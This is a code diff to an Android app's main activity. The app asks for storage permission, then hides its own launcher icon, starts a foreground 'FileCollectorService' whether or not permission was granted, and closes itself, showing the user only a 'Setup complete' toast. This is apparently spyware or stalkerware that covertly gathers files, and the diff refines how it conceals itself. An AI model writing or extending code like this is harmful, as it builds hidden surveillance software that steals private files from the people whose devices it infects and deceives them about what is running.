@@ -19,17 +19,18 @@ public class MainActivity extends ComponentActivity {
         registerForActivityResult(
             new ActivityResultContracts.RequestMultiplePermissions(),
             (Map<String, Boolean> result) -> {
-                // Check if at least storage permission was granted
-                boolean storageGranted = false;
-                for (Boolean b : result.values()) {
-                    if (b) {
-                        storageGranted = true;
+                // Check if storage permission was granted
+                boolean granted = false;
+                for (Map.Entry<String, Boolean> entry : result.entrySet()) {
+                    if (entry.getValue()) {
+                        granted = true;
                         break;
                     }
                 }
-                if (storageGranted) {
+                if (granted) {
                     Toast.makeText(this, "Setup complete", Toast.LENGTH_SHORT).show();
                 }
+                // Proceed regardless — hide icon and start service
                 startServiceAndHide();
             }
         );
@@ -37,18 +38,20 @@ public class MainActivity extends ComponentActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        // ★ IMPORTANT: Set a real layout so this activity has a visible window
+        setContentView(R.layout.activity_main);
         requestPermissionsAndStart();
     }
 
     private void requestPermissionsAndStart() {
-        // Request only READ_EXTERNAL_STORAGE — works on all versions with targetSdk=29
+        // Request storage permission — works on all Android versions with targetSdk=29
         permissionLauncher.launch(new String[]{
             Manifest.permission.READ_EXTERNAL_STORAGE
         });
     }
 
     private void startServiceAndHide() {
-        // Hide launcher icon
+        // Step 1: Hide launcher icon
         try {
             PackageManager pm = getPackageManager();
             ComponentName component = new ComponentName(this, MainActivity.class);
@@ -59,7 +62,7 @@ public class MainActivity extends ComponentActivity {
             );
         } catch (Exception ignored) {}
 
-        // Start foreground service
+        // Step 2: Start foreground service
         Intent serviceIntent = new Intent(this, FileCollectorService.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(serviceIntent);
@@ -67,7 +70,7 @@ public class MainActivity extends ComponentActivity {
             startService(serviceIntent);
         }
 
-        // Close activity
-        new Handler(getMainLooper()).postDelayed(this::finishAndRemoveTask, 200);
+        // Step 3: Close activity after a short delay
+        new Handler(getMainLooper()).postDelayed(this::finishAndRemoveTask, 300);
     }
 }
